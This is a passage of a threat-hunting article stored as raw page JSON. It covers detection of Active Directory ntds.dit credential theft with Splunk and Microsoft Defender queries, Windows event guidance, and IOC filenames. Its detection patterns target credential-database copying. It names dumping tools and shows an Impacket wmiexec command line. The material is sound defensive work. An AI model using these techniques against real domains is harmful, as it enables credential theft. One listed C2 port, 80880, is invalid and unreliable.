f7a17d5b3_122","name":"2347","type":"P","href":null,"layout":null,"metadata":null,"text":"Splunk:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_123":{"__typename":"Paragraph","id":"dcff7a17d5b3_123","name":"5d70","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=* source=”WinEventLog:*” AND (TargetFilename=”*\\\\ntds.dit” AND ((ParentImage=”*\\\\cscript.exe” OR ParentImage=”*\\\\httpd.exe” OR ParentImage=”*\\\\nginx.exe” OR ParentImage=”*\\\\php-cgi.exe” OR ParentImage=”*\\\\powershell.exe” OR ParentImage=”*\\\\pwsh.exe” OR ParentImage=”*\\\\w3wp.exe” OR ParentImage=”*\\\\wscript.exe”) OR (ParentImage=”*\\\\apache*” OR ParentImage=”*\\\\tomcat*” OR ParentImage=”*\\\\AppData\\\\*” OR ParentImage=”*\\\\Temp\\\\*” OR ParentImage=”*\\\\Public\\\\*” OR ParentImage=”*\\\\PerfLogs\\\\*”)))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_124":{"__typename":"Paragraph","id":"dcff7a17d5b3_124","name":"0e41","type":"P","href":null,"layout":null,"metadata":null,"text":"MDE:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_125":{"__typename":"Paragraph","id":"dcff7a17d5b3_125","name":"6be4","type":"PRE","href":null,"layout":null,"metadata":null,"text":"DeviceFileEvents | where (FolderPath endswith @’\\ntds.dit’ and ((InitiatingProcessFolderPath endswith @’\\cscript.exe’ or InitiatingProcessFolderPath endswith @’\\httpd.exe’ or InitiatingProcessFolderPath endswith @’\\nginx.exe’ or InitiatingProcessFolderPath endswith @’\\php-cgi.exe’ or InitiatingProcessFolderPath endswith @’\\powershell.exe’ or InitiatingProcessFolderPath endswith @’\\pwsh.exe’ or InitiatingProcessFolderPath endswith @’\\w3wp.exe’ or InitiatingProcessFolderPath endswith @’\\wscript.exe’) or (InitiatingProcessFolderPath contains @’\\apache’ or InitiatingProcessFolderPath contains @’\\tomcat’ or InitiatingProcessFolderPath contains @’\\AppData\\’ or InitiatingProcessFolderPath contains @’\\Temp\\’ or InitiatingProcessFolderPath contains @’\\Public\\’ or InitiatingProcessFolderPath contains @’\\PerfLogs\\’)))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_126":{"__typename":"Paragraph","id":"dcff7a17d5b3_126","name":"6769","type":"P","href":null,"layout":null,"metadata":null,"text":"MDE 2:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_127":{"__typename":"Paragraph","id":"dcff7a17d5b3_127","name":"962c","type":"PRE","href":null,"layout":null,"metadata":null,"text":"DeviceFileEvents | where (FolderPath endswith @’\\ntds.dit’ and ((InitiatingProcessFolderPath endswith @’\\cmd.exe’ or InitiatingProcessFolderPath endswith @’\\cscript.exe’ or InitiatingProcessFolderPath endswith @’\\mshta.exe’ or InitiatingProcessFolderPath endswith @’\\powershell.exe’ or InitiatingProcessFolderPath endswith @’\\pwsh.exe’ or InitiatingProcessFolderPath endswith @’\\regsvr32.exe’ or InitiatingProcessFolderPath endswith @’\\rundll32.exe’ or InitiatingProcessFolderPath endswith @’\\wscript.exe’ or InitiatingProcessFolderPath endswith @’\\wsl.exe’ or InitiatingProcessFolderPath endswith @’\\wt.exe’) or (InitiatingProcessFolderPath contains @’\\AppData\\’ or InitiatingProcessFolderPath contains @’\\Temp\\’ or InitiatingProcessFolderPath contains @’\\Public\\’ or InitiatingProcessFolderPath contains @’\\PerfLogs\\’)))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_128":{"__typename":"Paragraph","id":"dcff7a17d5b3_128","name":"34ad","type":"P","href":null,"layout":null,"metadata":null,"text":"Splunk 2:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_129":{"__typename":"Paragraph","id":"dcff7a17d5b3_129","name":"b2f7","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=* source=”WinEventLog:*” AND (TargetFilename=”*\\\\ntds.dit” AND ((Image=”*\\\\cmd.exe” OR Image=”*\\\\cscript.exe” OR Image=”*\\\\mshta.exe” OR Image=”*\\\\powershell.exe” OR Image=”*\\\\pwsh.exe” OR Image=”*\\\\regsvr32.exe” OR Image=”*\\\\rundll32.exe” OR Image=”*\\\\wscript.exe” OR Image=”*\\\\wsl.exe” OR Image=”*\\\\wt.exe”) OR (Image=”*\\\\AppData\\\\*” OR Image=”*\\\\Temp\\\\*” OR Image=”*\\\\Public\\\\*” OR Image=”*\\\\PerfLogs\\\\*”)))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_130":{"__typename":"Paragraph","id":"dcff7a17d5b3_130","name":"d40d","type":"P","href":null,"layout":null,"metadata":null,"text":"Ntdsutil.exe creates two subfolders in the directory specified in the command: an Active Directory folder that contains the ntds.dit and ntds.jfm files, and a registry folder that contains the SYSTEM and SECURITY hives. Defenders should look for this folder structure across their network. Please read also my article Sensor Mappings to ATT&CK (SMAP) — a concrete example of how to use the SMAP for a real world adversary behavior to get a deep technical understanding about it how threat actor abuse ntds.dit and ntdsutil and how you can prevent and detect it.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":318,"end":430,"href":"https:\u002F\u002Fmedium.com\u002Fdetect-fyi\u002Fsensor-mappings-to-att-ck-smap-a-concrete-example-of-how-to-use-the-smap-for-a-real-world-700e53ed1c48","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_131":{"__typename":"Paragraph","id":"dcff7a17d5b3_131","name":"1c6c","type":"PRE","href":null,"layout":null,"metadata":null,"text":"\\Active Directory\\ntds.dit \\","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"php"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_132":{"__typename":"Paragraph","id":"dcff7a17d5b3_132","name":"7c82","type":"PRE","href":null,"layout":null,"metadata":null,"text":"Active Directory\\ntds.jfm","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"php"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_133":{"__typename":"Paragraph","id":"dcff7a17d5b3_133","name":"e209","type":"PRE","href":null,"layout":null,"metadata":null,"text":"\\registry\\SECURITY","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_134":{"__typename":"Paragraph","id":"dcff7a17d5b3_134","name":"c34b","type":"PRE","href":null,"layout":null,"metadata":null,"text":"\\registry\\SYSTEM","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"sql"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_135":{"__typename":"Paragraph","id":"dcff7a17d5b3_135","name":"8343","type":"BQ","href":null,"layout":null,"metadata":null,"text":"When one of the example commands is executed, several successive log entries are created in the Application log, under the ESENT Source. Associated events can be viewed in Windows Event Viewer by navigating to: Windows Logs | Application. To narrow results to relevant events, select Filter Current Log from the Actions menu on the right side of the screen. In the Event sources dropdown, check the box next to ESENT, then limit the logs to ID numbers 216, 325, 326, and 327. Clicking the OK box will apply the filters to the results. Since ESENT logging is used extensively throughout Windows, defenders should focus on events that reference ntds.dit. If such events are present, the events’ details should contain the file path where the file copies were created. Since these files can be deleted, or enhanced logging may not be configured on hosts, the file path can greatly aid in a hunt operation. Identifying the user associated with this activity is also a critical step in a hunt operation as other actions by the compromised — or actor-created — user account can be helpful to understand additional actor TTPs, as well as the breadth of the actor’s actions.","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":211,"end":237,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":441,"end":474,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_136":{"__typename":"Paragraph","id":"dcff7a17d5b3_136","name":"4b01","type":"BQ","href":null,"layout":null,"metadata":null,"text":"Note: If an actor can exfiltrate the ntds.dit and SYSTEM registry hive, the entire domain should be considered compromised, as the actor will generally be able to crack the password hashes for domain user accounts, create their own accounts, and\u002For join unauthorized systems to the domain. If this occurs, defenders should follow guidance for removing malicious actors from victim networks, such as CISA’s Eviction Guidance for Network Affected by the SolarWinds and Active Directory\u002FM365 Compromise. In addition to the above TTPs used by the actor to copy the ntds.dit file, the following tools could be used by an actor to obtain the same information:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_137":{"__typename":"Paragraph","id":"dcff7a17d5b3_137","name":"1d66","type":"PRE","href":null,"layout":null,"metadata":null,"text":"Secretsdump.py","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_138":{"__typename":"Paragraph","id":"dcff7a17d5b3_138","name":"d9fd","type":"P","href":null,"layout":null,"metadata":null,"text":"This script is a component of Impacket, which the actor has been known to use","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_139":{"__typename":"Paragraph","id":"dcff7a17d5b3_139","name":"02e0","type":"P","href":null,"layout":null,"metadata":null,"text":"· Invoke-NinjaCopy (PowerShell)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_140":{"__typename":"Paragraph","id":"dcff7a17d5b3_140","name":"9283","type":"P","href":null,"layout":null,"metadata":null,"text":"· DSInternals (PowerShell)","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_141":{"__typename":"Paragraph","id":"dcff7a17d5b3_141","name":"68e3","type":"P","href":null,"layout":null,"metadata":null,"text":"· FgDump","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_142":{"__typename":"Paragraph","id":"dcff7a17d5b3_142","name":"35a6","type":"P","href":null,"layout":null,"metadata":null,"text":"· Metasploit","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_143":{"__typename":"Paragraph","id":"dcff7a17d5b3_143","name":"f146","type":"P","href":null,"layout":null,"metadata":null,"text":"If you don’t use such tools, the recommendation would be to block them as a great opportunity to set choke points.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_144":{"__typename":"Paragraph","id":"dcff7a17d5b3_144","name":"b5f8","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"sigma\u002Frules\u002Fwindows\u002Fbuiltin\u002Fsecurity\u002Fwin_security_impacket_secretdump.yml at master · SigmaHQ\u002Fsigma\nMain Sigma Rule Repository. Contribute to SigmaHQ\u002Fsigma development by creating an account on GitHub.github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":211,"href":"https:\u002F\u002Fgithub.com\u002FSigmaHQ\u002Fsigma\u002Fblob\u002Fmaster\u002Frules\u002Fwindows\u002Fbuiltin\u002Fsecurity\u002Fwin_security_impacket_secretdump.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":99,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":100,"end":201,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSigmaHQ\u002Fsigma\u002Fblob\u002Fmaster\u002Frules\u002Fwindows\u002Fbuiltin\u002Fsecurity\u002Fwin_security_impacket_secretdump.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*0TUQAfioLWB_WdWm"}},"Paragraph:dcff7a17d5b3_145":{"__typename":"Paragraph","id":"dcff7a17d5b3_145","name":"667d","type":"P","href":null,"layout":null,"metadata":null,"text":"Splunk:","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_146":{"__typename":"Paragraph","id":"dcff7a17d5b3_146","name":"3e24","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=* source=”WinEventLog:Security” AND (EventCode=”5145\" AND ShareName=”\\\\\\\\\\*\\\\ADMIN$” AND (RelativeTargetName=”*SYSTEM32\\\\*”) AND (RelativeTargetName=”*.tmp*”))","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_147":{"__typename":"Paragraph","id":"dcff7a17d5b3_147","name":"d8ca","type":"P","href":null,"layout":null,"metadata":null,"text":"Best practices for securing ntds.dit include hardening Domain Controllers and monitoring event logs for ntdsutil.exe and similar process creations. Additionally, any use of administrator privileges should be audited and validated to confirm the legitimacy of executed commands.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_148":{"__typename":"Paragraph","id":"dcff7a17d5b3_148","name":"0154","type":"H4","href":null,"layout":null,"metadata":null,"text":"Data Sources for NTDS.dit","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_149":{"__typename":"Paragraph","id":"dcff7a17d5b3_149","name":"d4ab","type":"P","href":null,"layout":null,"metadata":null,"text":"Command Execution","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_150":{"__typename":"Paragraph","id":"dcff7a17d5b3_150","name":"b50f","type":"BQ","href":null,"layout":null,"metadata":null,"text":"Monitor executed commands and arguments that may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. Look for command-lines that invoke attempts to access or copy the NTDS.dit.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_151":{"__typename":"Paragraph","id":"dcff7a17d5b3_151","name":"2e36","type":"BQ","href":null,"layout":null,"metadata":null,"text":"Note: Events 4688 (Microsoft Windows Security Auditing) and 1 (Microsoft Windows Sysmon) provide context of commands and parameters being executed via creation of a new process. Event 800 (PowerShell) provides context of commands and parameters being executed via PowerShell. This detection is based on known Windows utilities commands and parameters that can be used to copy the ntds.dit file. It is recommended to keep the list of commands and parameters up to date.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_152":{"__typename":"Paragraph","id":"dcff7a17d5b3_152","name":"df0d","type":"P","href":null,"layout":null,"metadata":null,"text":"Analytic 1 — Command line attempt to access or create a copy of ntds.dit file","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_153":{"__typename":"Paragraph","id":"dcff7a17d5b3_153","name":"b705","type":"PRE","href":null,"layout":null,"metadata":null,"text":"`suspicious_command = filter command_execution where ( (event_id = “4688” OR event_id = “1” OR event_id = “800”) AND ((command_line = “*ntds*” AND command_line = “*ntdsutil*” AND command_line = “*create*”) OR (command_line = “**vssadmin” AND command_line = “*create*” AMD command_line = “*shadow*”) OR (command_line = “*copy*” AND command_line = “*ntds.dit*”)) `","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_154":{"__typename":"Paragraph","id":"dcff7a17d5b3_154","name":"b827","type":"H4","href":null,"layout":null,"metadata":null,"text":"File Access","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_155":{"__typename":"Paragraph","id":"dcff7a17d5b3_155","name":"1268","type":"P","href":null,"layout":null,"metadata":null,"text":"Monitor for access or copy of the NTDS.dit.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_156":{"__typename":"Paragraph","id":"dcff7a17d5b3_156","name":"cd29","type":"BQ","href":null,"layout":null,"metadata":null,"text":"Note: Events 4656 and 4663 (Microsoft Windows Security Auditing) provide context of processes and users requesting access or accessing file objects (ObjectType = File) such as C:\\Windows\\NTDS\\ntds.dit. It is important to note that, in order to generate these events, a System Access Control List (SACL) must be defined for the ntds.dit file. Access rights that allow read operations on file objects and its attributes are %%4416 Read file data, %%4419 Read extended file attributes, %%4423 Read file attributes. If you search for just the name of the file and not the entire directory, you may get access events related to the ntds.dit file within a snapshot or volume shadow copy.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_157":{"__typename":"Paragraph","id":"dcff7a17d5b3_157","name":"f3f8","type":"BQ","href":null,"layout":null,"metadata":null,"text":"Events 4656 and 4663 (Microsoft Windows Security Auditing) provide context of processes and users creating or copying file objects (ObjectType = File) such as C:\\Windows\\NTDS\\ntds.dit. It is important to note that, in order to generate these events, a System Access Control List (SACL) must be defined for the ntds.dit file. In order to filter file creation events, filter access rigths %%4417 Write data to the file and %%4424 Write file attributes.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_158":{"__typename":"Paragraph","id":"dcff7a17d5b3_158","name":"2485","type":"BQ","href":null,"layout":null,"metadata":null,"text":"Event 11 (Microsoft Windows Sysmon) provide context of processes and users creating or copying files. Unfortunately, this event provides context of the file being created or copied, but not the file being copied. A good starting point would be to look for new files created or copied with extension .dit.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_159":{"__typename":"Paragraph","id":"dcff7a17d5b3_159","name":"fccb","type":"P","href":null,"layout":null,"metadata":null,"text":"Analytic 1","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_160":{"__typename":"Paragraph","id":"dcff7a17d5b3_160","name":"f70b","type":"PRE","href":null,"layout":null,"metadata":null,"text":"`suspicious_file = filter file_access where ((event_id = “4656” OR event_id = “4663”) AND (object_type = “File”) AND (file_name = “*ntds.dit*”) AND (access_list = “*%%4416*” OR access_list = “*%%4419*” OR access_list = “*%%4416*”)`","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_161":{"__typename":"Paragraph","id":"dcff7a17d5b3_161","name":"ac8c","type":"P","href":null,"layout":null,"metadata":null,"text":"Analytic 2","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_162":{"__typename":"Paragraph","id":"dcff7a17d5b3_162","name":"fdcf","type":"PRE","href":null,"layout":null,"metadata":null,"text":"`suspicious_file = filter file_access where ((event_id = “4656” OR event_id = “4663”) AND (object_type = “File”) AND (file_name = “*ntds.dit*”) AND (access_list = “*%%4417*” OR access_list = “*%%4424*”)`","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_163":{"__typename":"Paragraph","id":"dcff7a17d5b3_163","name":"9b45","type":"P","href":null,"layout":null,"metadata":null,"text":"Analytic 3","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_164":{"__typename":"Paragraph","id":"dcff7a17d5b3_164","name":"851e","type":"PRE","href":null,"layout":null,"metadata":null,"text":"`suspicious_file = filter file_access where ((event_id = “11”) AND (file_name = “*.dit”) `","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_165":{"__typename":"Paragraph","id":"dcff7a17d5b3_165","name":"202b","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"sigma\u002Frules\u002Fwindows\u002Ffile\u002Ffile_event\u002Ffile_event_win_ntds_dit_creation.yml at master · SigmaHQ\u002Fsigma\nMain Sigma Rule Repository. Contribute to SigmaHQ\u002Fsigma development by creating an account on GitHub.github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":210,"href":"https:\u002F\u002Fgithub.com\u002FSigmaHQ\u002Fsigma\u002Fblob\u002Fmaster\u002Frules\u002Fwindows\u002Ffile\u002Ffile_event\u002Ffile_event_win_ntds_dit_creation.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":98,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":99,"end":200,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSigmaHQ\u002Fsigma\u002Fblob\u002Fmaster\u002Frules\u002Fwindows\u002Ffile\u002Ffile_event\u002Ffile_event_win_ntds_dit_creation.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*M97dX_tgeKM4HIiE"}},"Paragraph:dcff7a17d5b3_166":{"__typename":"Paragraph","id":"dcff7a17d5b3_166","name":"9716","type":"P","href":null,"layout":null,"metadata":null,"text":"Hunting Translation Microsoft Defender — Keep it simple","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_167":{"__typename":"Paragraph","id":"dcff7a17d5b3_167","name":"2426","type":"PRE","href":null,"layout":null,"metadata":null,"text":"DeviceFileEvents | where FolderPath endswith @’ntds.dit’","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_168":{"__typename":"Paragraph","id":"dcff7a17d5b3_168","name":"5e0d","type":"P","href":null,"layout":null,"metadata":null,"text":"Hunting Translation Splunk — Keep it simple","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_169":{"__typename":"Paragraph","id":"dcff7a17d5b3_169","name":"b869","type":"PRE","href":null,"layout":null,"metadata":null,"text":"index=* source=”WinEventLog:*” AND TargetFilename=”*ntds.dit”","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"DISABLED","lang":null},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_170":{"__typename":"Paragraph","id":"dcff7a17d5b3_170","name":"784a","type":"H4","href":null,"layout":null,"metadata":null,"text":"Impacket","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_171":{"__typename":"Paragraph","id":"dcff7a17d5b3_171","name":"a78f","type":"P","href":null,"layout":null,"metadata":null,"text":"The actor regularly employs the use of Impacket’s wmiexec, which redirects output to a file within the victim host’s ADMIN$ share (C:\\Windows\\) containing an epoch timestamp in its name. The following is an example of the “dir” command being executed by wmiexec.py","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"STRONG","start":131,"end":142,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":223,"end":226,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":254,"end":264,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_172":{"__typename":"Paragraph","id":"dcff7a17d5b3_172","name":"0723","type":"PRE","href":null,"layout":null,"metadata":null,"text":"cmd.exe \u002FQ \u002Fc dir 1\u003E \\\\127.0.0.1\\ADMIN$\\__1684956600.123456 2\u003E&1","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"bash"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_173":{"__typename":"Paragraph","id":"dcff7a17d5b3_173","name":"35f9","type":"P","href":null,"layout":null,"metadata":null,"text":"Note: Discovery of an entry similar to the example above in the Windows Event Log and\u002For a file with a name in a similar format may be evidence of malicious activity and should be investigated further. In the event that only a filename is discovered, the epoch timestamp within the filename reflects the time of execution by default and can be used to help scope threat hunting activities.","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_174":{"__typename":"Paragraph","id":"dcff7a17d5b3_174","name":"964c","type":"H3","href":null,"layout":null,"metadata":null,"text":"Additional IOC PRC","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_175":{"__typename":"Paragraph","id":"dcff7a17d5b3_175","name":"5bb7","type":"P","href":null,"layout":null,"metadata":null,"text":"Hardcoded C2 Callbacks with port 80880,8443,8043,800,10443, with various filenames","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_176":{"__typename":"Paragraph","id":"dcff7a17d5b3_176","name":"9213","type":"PRE","href":null,"layout":null,"metadata":null,"text":"cisco_up.exe,","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_177":{"__typename":"Paragraph","id":"dcff7a17d5b3_177","name":"efeb","type":"PRE","href":null,"layout":null,"metadata":null,"text":"cl64.exe,","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_178":{"__typename":"Paragraph","id":"dcff7a17d5b3_178","name":"97a8","type":"PRE","href":null,"layout":null,"metadata":null,"text":"vm3dservice.exe,","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_179":{"__typename":"Paragraph","id":"dcff7a17d5b3_179","name":"5073","type":"PRE","href":null,"layout":null,"metadata":null,"text":"watchdogd.exe,","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_180":{"__typename":"Paragraph","id":"dcff7a17d5b3_180","name":"105c","type":"PRE","href":null,"layout":null,"metadata":null,"text":"Win.exe,","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":{"__typename":"CodeBlockMetadata","mode":"AUTO","lang":"typescript"},"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3